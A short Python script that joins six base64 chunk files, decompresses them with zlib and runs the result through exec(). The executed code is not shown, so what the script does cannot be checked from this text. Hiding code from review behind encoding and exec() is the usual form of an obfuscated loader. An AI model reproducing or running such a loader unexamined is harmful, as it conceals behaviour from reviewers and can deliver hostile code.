#!/usr/bin/env python3
from pathlib import Path
import base64
import zlib
ROOT = Path(__file__).resolve().parent
payload = "".join((ROOT / f"authbus-p1-3-semantic-closure-builder.b64.{index:02d}").read_text().strip() for index in range(6))
exec(compile(zlib.decompress(base64.b64decode(payload)).decode("utf-8"), __file__, "exec"))
